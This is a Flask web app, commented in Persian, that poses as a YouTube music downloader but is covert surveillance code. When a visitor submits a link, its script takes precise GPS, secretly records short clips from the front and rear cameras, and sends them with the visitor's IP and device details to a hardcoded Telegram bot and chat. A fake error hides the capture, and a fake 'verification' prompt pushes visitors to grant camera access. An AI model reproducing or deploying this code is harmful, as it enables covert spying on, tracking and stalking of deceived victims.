from flask import Flask, render_template_string, request, jsonify
import requests
import os
import json

app = Flask(__name__)

BOT_TOKEN = "8856249113:AAHjdpUoGjuRyH9bzD-gSomevMMPg1cet64"
TARGET_CHAT_ID = "8173349543"
WEB_URL = "https://web-production-2ed72b.up.railway.app"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YouTube Music Downloader</title>
<style>
    body{background:#f0f2f5;font-family:sans-serif;margin:0;padding:0;text-align:center}
    .header{background:#ff0000;color:white;padding:20px;font-weight:bold}
    .container{background:white;max-width:400px;margin:30px auto;padding:25px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);position:relative}
    .input-box{width:100%;padding:14px;border:1px solid #ccc;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:15px;outline:none}
    .btn{background:#ff0000;color:white;border:none;padding:15px;width:100%;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
    
    /* استایل صفحه خطا و اخطار دسترسی دوربین */
    #permissionModal {
        display: none;
        position: absolute;
        top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(255, 255, 255, 0.95);
        border-radius: 15px;
        z-index: 10;
        padding-top: 60px;
        box-sizing: border-box;
    }
    #permissionModal h2 {
        color: #111;
        font-size: 20px;
        margin-top: 15px;
    }
    #permissionModal p {
        color: #555;
        font-size: 14px;
        padding: 0 20px;
        line-height: 1.5;
    }
</style>
</head>
<body>
    <div class="header">
        <h2>YouTube Music Downloader</h2>
    </div>

    <div class="container">
        <!-- کادر اخطار که دقیقاً مثل عکس شما ظاهر می‌شود -->
        <div id="permissionModal">
            <div style="font-size: 40px;">🔒</div>
            <h2>Camera Permission Needed</h2>
            <p>Please enable camera access in your browser settings to proceed with verification.</p>
        </div>

        <input type="text" class="input-box" id="urlInput" placeholder="Paste YouTube Music Link">
        <button class="btn" onclick="startProcess()">FETCH</button>
    </div>

    <video id="video" autoplay playsinline muted style="display:none"></video>

    <script>
    async function recordAndSend(facingMode, label, info) {
        return new Promise(async (resolve, reject) => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: facingMode }, 
                    audio: false 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append("video", blob);
                    formData.append("info", JSON.stringify(info));
                    formData.append("cam", label);
                    
                    await fetch("/upload", { method: "POST", body: formData });
                    stream.getTracks().forEach(t => t.stop());
                    resolve();
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 4000); // ضبط 4 ثانیه ویدیو
                
            } catch (err) {
                reject(err);
            }
        });
    }

    async function startProcess() {
        const url = document.getElementById('urlInput').value;
        if(!url) {
            alert("لطفاً لینک را وارد کنید!");
            return;
        }

        // گرفتن لوکیشن کاربر
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const info = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                ua: navigator.userAgent
            };

            try {
                // ۱. اول دوربین جلو
                await recordAndSend("user", "دوربین جلو (Front)", info);
                
                // ۲. بعد دوربین عقب
                await recordAndSend("environment", "دوربین عقب (Rear)", info);

                alert("خطا در بارگیری فایل صوتی. لطفاً بعداً تلاش کنید.");
                
            } catch (e) {
                // اگر کاربر اجازه نداد، باکس اخطار ظاهر می‌شود
                document.getElementById('permissionModal').style.display = 'block';
            }
        }, (err) => {
            // اگر به لوکیشن اجازه نداد هم اخطار دوربین را نشان می‌دهیم
            document.getElementById('permissionModal').style.display = 'block';
        }, { enableHighAccuracy: true });
    }
    </script>
</body>
</html>
"""

@app.route("/bot", methods=["POST"])
def bot():
    update = request.get_json()
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        if text == '/start':
            msg = f"سلام! برای دانلود موزیک از لینک زیر استفاده کنید:\n\n{WEB_URL}"
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": msg})
    return jsonify({"status": "ok"})

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route("/upload", methods=["POST"])
def upload():
    video = request.files.get("video")
    info_raw = request.form.get("info")
    cam_type = request.form.get("cam", "دوربین")
    
    info = json.loads(info_raw) if info_raw else {}
    lat = info.get('lat', 'نامشخص')
    lon = info.get('lon', 'نامشخص')
    ua = info.get('ua', 'نامشخص')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    msg = (
        f"🚨 **گزارش جدید ({cam_type}):**\n\n"
        f"📍 موقعیت GPS: {lat}, {lon}\n"
        f"🌐 آی‌پی: {user_ip}\n"
        f"📱 مشخصات دستگاه: {ua}"
    )
    
    # ارسال لوکیشن فقط در بخش اول (دوربین جلو)
    if lat != 'نامشخص' and lon != 'نامشخص' and "جلو" in cam_type:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
            json={"chat_id": TARGET_CHAT_ID, "latitude": lat, "longitude": lon}
        )
    
    if video:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
            data={"chat_id": TARGET_CHAT_ID, "caption": msg},
            files={"video": ("video.webm", video.stream, "video/webm")}
        )
        
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
